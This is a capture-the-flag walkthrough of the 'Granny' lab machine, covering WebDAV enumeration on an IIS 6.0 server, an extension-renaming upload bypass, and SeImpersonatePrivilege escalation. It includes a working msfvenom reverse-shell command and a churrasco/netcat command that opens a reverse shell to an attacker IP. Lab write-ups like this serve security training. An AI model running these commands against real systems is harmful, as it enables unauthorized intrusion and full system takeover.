# Granny

## Overview

Looking at the box we find a webserver on port 80. Investigating the webserver we find that the server implements a WebDav service. Looking into this we find that we can upload and move files on the webserver. After uploading a reverse shell we get access to the server. Moving on, we find that the user we have on the machine has the SeImpersonatePrivilege enabled. This privilege can be used to escalate our privileges on the machine to System. 

## Enumeration

Doing an Nmap scan on the host shows that only port 80 is open. Using Nmap we get more information and find out that it is a webserver.

```bash
sudo nmap -p- 10.10.10.15 -oA nmap/all-ports
[sudo] password for tc: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-25 16:55 EDT
Nmap scan report for 10.10.10.15
Host is up (0.019s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 118.19 seconds
```

```bash
sudo nmap -p80 -sC -sV 10.10.10.15 -oA nmap/info
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-25 16:57 EDT
Nmap scan report for 10.10.10.15
Host is up (0.018s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Date: Tue, 25 May 2021 21:01:00 GMT
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.86 seconds
```

## Getting user

### Tools

Based on the methods from the above Nmap scan I eventually investigate the webserver using a tool called ```davtest```. This tool can be found [here](https://code.google.com/archive/p/davtest/downloads). Using this tool we find that we can upload files with certain extensions. Another capability of a WebDav service we can move files on the server. Using a tool called ```cadaver``` we can interact with the WebDav service. Cadaver can be installed from the repo using ```sudo apt install cadaver```. 

### Exploiting

Using davtest we see that we can upload files to the server. However, there are only certain extensions that we can upload. Below is the output from davtest.

```bash
cat davtest.out
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.15
********************************************************
NOTE    Random string for this session: sTWUtSJ
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_sTWUtSJ
********************************************************
 Sending test files
PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_sTWUtSJ/davtest_sTWUtSJ.php
PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_sTWUtSJ/davtest_sTWUtSJ.jhtml
PUT     asp     FAIL
PUT     shtml   FAIL
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_sTWUtSJ/davtest_sTWUtSJ.txt
PUT     aspx    FAIL
PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_sTWUtSJ/davtest_sTWUtSJ.html
PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_sTWUtSJ/davtest_sTWUtSJ.pl
PUT     cgi     FAIL
PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_sTWUtSJ/davtest_sTWUtSJ.jsp
PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_sTWUtSJ/davtest_sTWUtSJ.cfm
********************************************************
 Checking for test file execution
EXEC    php     FAIL
EXEC    jhtml   FAIL
EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_sTWUtSJ/davtest_sTWUtSJ.txt
EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_sTWUtSJ/davtest_sTWUtSJ.html
EXEC    pl      FAIL
EXEC    jsp     FAIL
EXEC    cfm     FAIL

********************************************************
./davtest.pl Summary:
Created: http://10.10.10.15/DavTestDir_sTWUtSJ
PUT File: http://10.10.10.15/DavTestDir_sTWUtSJ/davtest_sTWUtSJ.php
PUT File: http://10.10.10.15/DavTestDir_sTWUtSJ/davtest_sTWUtSJ.jhtml
PUT File: http://10.10.10.15/DavTestDir_sTWUtSJ/davtest_sTWUtSJ.txt
PUT File: http://10.10.10.15/DavTestDir_sTWUtSJ/davtest_sTWUtSJ.html
PUT File: http://10.10.10.15/DavTestDir_sTWUtSJ/davtest_sTWUtSJ.pl
PUT File: http://10.10.10.15/DavTestDir_sTWUtSJ/davtest_sTWUtSJ.jsp
PUT File: http://10.10.10.15/DavTestDir_sTWUtSJ/davtest_sTWUtSJ.cfm
Executes: http://10.10.10.15/DavTestDir_sTWUtSJ/davtest_sTWUtSJ.txt
Executes: http://10.10.10.15/DavTestDir_sTWUtSJ/davtest_sTWUtSJ.html
```

In order to get a shell we first use msfvenom to create a reverse shell. This shell will be in the ```asp``` format which is a format that a windows server can execute. 

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.18 LPORT=8000 -f asp > shell.asp
```

Once we have the shell ready we can connect to the server using cadaver. However, we can not directly upload an asp file. Therefore, we upload the file as a txt file. This is done by simply renaming the file. After uploading the file, we move the file on the server making it a asp file. Once the file is moved we navigate to the file and get a shell.

```bash
cadaver http://10.10.10.15
# Upload the shell (as a txt to be allowed)
dav:/> put shell.txt
Uploading shell.txt to '/shell.txt':
Progress: [=============================>] 100.0% of 38211 bytes succeeded.                                
# Move it to asp to get code execution
dav:/> move shell.txt shell.asp
Moving '/shell.txt' to '/shell.asp':  succeeded.
```

## Getting system

Using the ```whoami /all``` command we can see the privileges that we have. 

![whoami privileges](/attachments/granny1.png)

Looking over the privileges we notice that we have the ```SeImpersonatePrivilege``` which is what we can use to escalate privileges. One way to escalate our privileges is to use [churrasco.exe](https://github.com/Re4son/Churrasco). This program exploits the privilege and then runs a command that is given. In this case I uploaded a copy of nc to the server and used that to send back a reverse shell. 

```bash
churrasco.exe -d "C:\Inetpub\wwwroot\nc.exe -e cmd.exe 10.10.14.18 8001"
```

At this point we are an administrative user on the box.